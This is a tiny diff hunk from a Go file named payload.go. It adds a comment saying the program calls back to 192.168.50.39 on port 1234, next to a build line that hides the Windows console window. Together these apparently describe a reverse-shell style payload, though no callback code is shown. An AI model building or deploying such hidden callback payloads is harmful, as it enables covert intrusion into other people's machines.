@@ -1,4 +1,5 @@
 package main
+// Calls back to 192.168.50.39 on port 1234 on line 96
 
 // Build with go build -ldflags -H=windowsgui payload.go
 
